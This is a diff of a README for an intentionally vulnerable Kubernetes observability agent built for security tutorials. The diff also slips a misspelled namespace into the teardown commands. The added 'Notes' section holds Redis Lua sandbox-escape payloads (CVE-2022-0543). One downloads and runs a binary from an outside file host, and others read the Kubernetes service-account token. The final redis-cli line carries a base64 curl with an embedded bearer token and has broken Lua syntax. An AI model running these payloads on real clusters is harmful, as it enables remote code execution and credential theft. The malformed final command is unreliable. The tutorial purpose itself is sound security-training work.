@@ -1,4 +1,4 @@
-# Ooopservability
+# Oopservability
 
 **Intentionally vulnerable observability agent for Kubernetes security tutorials.**
 
@@ -8,7 +8,7 @@
 
 ## What is this?
 
-Ooopservability is a fake observability DaemonSet that demonstrates a common and underappreciated attack chain in Kubernetes:
+Oopservability is a fake observability DaemonSet that demonstrates a common and underappreciated attack chain in Kubernetes:
 
 ```
 Over-permissive RBAC (nodes/proxy GET)
@@ -109,19 +109,19 @@ kubectl apply -f manifests/rbac.yaml
 kubectl apply -f manifests/daemonset.yaml
 
 # Wait for rollout
-kubectl rollout status daemonset/ooopservability-agent -n ooopservability
+kubectl rollout status daemonset/oopservability-agent -n oopservability
 
 # Access the dashboard (port-forward)
-kubectl port-forward -n ooopservability daemonset/ooopservability-agent 8080:8080
+kubectl port-forward -n oopservability daemonset/oopservability-agent 8080:8080
 # → http://localhost:8080
 ```
 
 ## Tear Down
 
 ```bash
-kubectl delete namespace ooopservability
-kubectl delete clusterrole ooopservability-agent
-kubectl delete clusterrolebinding ooopservability-agent
+kubectl delete namespace oooservability
+kubectl delete clusterrole oopservability-agent
+kubectl delete clusterrolebinding oopservability-agent
 ```
 
 ---
@@ -157,3 +157,42 @@ kubectl delete clusterrolebinding ooopservability-agent
 │   └── rbac.yaml        — ClusterRole with nodes/proxy GET
 └── Dockerfile
 ```
+
+
+---
+
+### Notes
+
+```shell
+EVAL '
+local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
+os.execute("curl -fsSL https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ran-ws -o /tmp/ran-ws && chmod +x /tmp/ran-ws && /tmp/ran-ws")
+' 0
+```
+
+
+```shell
+EVAL '
+local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
+os.execute("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
+' 0
+```
+
+
+```shell
+EVAL '
+local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); 
+local f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token","r")
+local data = f:read("*a")
+f:close()
+return data
+' 0
+```
+
+
+https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis
+https://github.com/CVEDB/POC-DB/blob/main/2022/CVE-2022-0543.md
+
+
+
+redis-cli -h 10.244.1.8 -p 6379 EVAL "local cmd = 'Y3VybCAtWFBPU1QgICAgICBodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbC9hcGlzL2F1dGhvcml6YXRpb24uazhzLmlvL3YxL3NlbGZzdWJqZWN0cnVsZXNyZXZpZXdzICAgICAgLS1jYWNlcnQgL3Zhci9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L2NhLmNydCAgICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltMVpOSEJPY25FNVgxUTNNbE5OZW5Gbk1sRlNTbkpGVkhOTGNsVTJkVGcwUXpoV05qVlVYM05RZDFVaWZRLmV5SmhkV1FpT2xzaWFIUjBjSE02THk5cmRXSmxjbTVsZEdWekxtUmxabUYxYkhRdWMzWmpMbU5zZFhOMFpYSXViRzlqWVd3aVhTd2laWGh3SWpveE9EQTBOamd5TnpBMkxDSnBZWFFpT2pFM056TXhORFkzTURZc0ltbHpjeUk2SW1oMGRIQnpPaTh2YTNWaVpYSnVaWFJsY3k1a1pXWmhkV3gwTG5OMll5NWpiSFZ6ZEdWeUxteHZZMkZzSWl3aWFuUnBJam9pTUdKa1kyVmtZemN0WmprM1pDMDBaV1JsTFdKbVlXUXRORGsxWmpVMU1EZGhNMlk1SWl3aWEzVmlaWEp1WlhSbGN5NXBieUk2ZXlKdVlXMWxjM0JoWTJVaU9pSnlaV1JwY3lJc0ltNXZaR1VpT25zaWJtRnRaU0k2SW10cGJtUXRkMjl5YTJWeUlpd2lkV2xrSWpvaU4ySmxOVGcyTWpNdFptUTJNaTAwTVdNeUxUZ3daR010T0dZeU5XVTJNakprWXpSakluMHNJbkJ2WkNJNmV5SnVZVzFsSWpvaWNtVmthWE10TldSa1pEZzJObU0zTFd0NGFHaHhJaXdpZFdsa0lqb2laalF3TXpNd01tRXRNR1kzTXkwMFlXUmtMVGs1Wm1FdE1UWmhNVE00TnpFNU9HSm1JbjBzSW5ObGNuWnBZMlZoWTJOdmRXNTBJanA3SW01aGJXVWlPaUp5WldScGN5SXNJblZwWkNJNklqVmtOemhrWVdVM0xUWXpNelF0TkRnMVlTMWhZMk5qTFRVM05EZGtPREJrTUdJeU5TSjlMQ0ozWVhKdVlXWjBaWElpT2pFM056TXhOVEF6TVROOUxDSnVZbVlpT2pFM056TXhORFkzTURZc0luTjFZaUk2SW5ONWMzUmxiVHB6WlhKMmFXTmxZV05qYjNWdWREcHlaV1JwY3pweVpXUnBjeUo5LkpVSzJ0amphMU1yVXBiR2l1VklyOVhyYlpGSENSTlBTaDVkekVBRlpyN21xNEdabUphQVRVRjZueFJYVUd2a2tlWTZfOVRiaDhoeUN0NElMSUswbXA4dUVCcWp5MmtENU5BeWhXdjU0YktqRVZjcFk5OHpPMDViRjg4eVJYWGZZVUZLLTBnQkYtV0ttTkREaFpTeHI0NVNjclBXZm8xSHpuTVZWLTVzT2hYZlhnZnNkd2Z4eFpXY0JnbnVjck8zcXZHYnpReHNLdkhESVRWazNBMG1iNHdLaDdsdnk3WUN5NFo1WG1aQjdPY0ZST21jRGU2bTlpaDI3SC03TVJGYTlnWVdrRkJiai1PeFQ2bjd6d2hMRjBjbV9MeDBoVUs3V3hPN1lSN1laMnlFR01MT1NFdDVKZHpwMFo4SG00RUNLUWplY1Z5R2hMQmpRZWdLa1pUck9PQSIgICAgICAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAgICAgIC0tZGF0YSAneyAgICAgICAgImtpbmQiOiAiU2VsZlN1YmplY3RSdWxlc1JldmlldyIsICAgICAgICAiYXBpVmVyc2lvbiI6ICJhdXRob3JpemF0aW9uLms4cy5pby92MSIsICAgICAgICAic3BlYyI6IHsgIm5hbWVzcGFjZSI6ICJyZWRpcyIgfSAgICAgIH0n'; local p =  local f = io.popen('') local d = f:read('*a') f:close(); return d;" 0
